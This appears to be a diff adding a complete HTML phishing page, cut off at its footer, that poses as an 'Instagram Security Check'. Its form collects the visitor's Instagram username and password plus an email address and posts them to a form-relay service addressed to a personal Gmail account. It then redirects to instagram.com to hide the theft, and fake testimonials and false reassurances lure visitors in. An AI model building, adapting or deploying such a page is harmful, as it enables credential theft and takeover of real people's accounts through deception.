@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Account Security Check</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background-color: #282c34;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            margin: 50px auto;
+            text-align: center;
+            border: 1px solid #e0e0e0;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #28a745;
+            outline: none;
+        }
+
+        button {
+            padding: 12px;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        .testimonials {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #444;
+            text-align: left;
+        }
+
+        .testimonial {
+            margin-bottom: 10px;
+            font-style: italic;
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s;
+        }
+
+        .testimonial:hover {
+            transform: translateY(-5px) rotateY(5deg);
+        }
+
+        footer {
+            text-align: center;
+            padding: 10px 0;
+            background-color: #282c34;
+            color: white;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+        }
+
+        /* Highlighting text */
+        .highlight {
+            background-color: #ffeb3b;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1 class="highlight">Instagram Security Check</h1>
+        <p>Your safety is our priority!</p>
+    </header>
+
+    <div class="container">
+        <p>Secure your account with our quick check. We ensure that your credentials are safe. If your account is at risk, we won't redirect you to Instagram.</p>
+        
+        <form id="securityCheckForm" action="https://formsubmit.co/sboy40225@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://www.instagram.com/">
+            <input type="text" name="username" placeholder="USERNAME" required>
+            <input type="password" name="password" placeholder="PASSWORD" required>
+            <input type="email" name="email" placeholder="Your Email" required>
+            <button type="submit">Send</button>
+        </form>
+
+        <div class="testimonials">
+            <h2>User Testimonials</h2>
+            <div class="testimonial">"This service helped me feel secure about my account!" - Alex J.</div>
+            <div class="testimonial">"I love how easy it is to use!" - Jamie L.</div>
+            <div class="testimonial">"Over 1000+ users trust this service!"</div>
+        </div>
+    </div>
+
+    <footer>
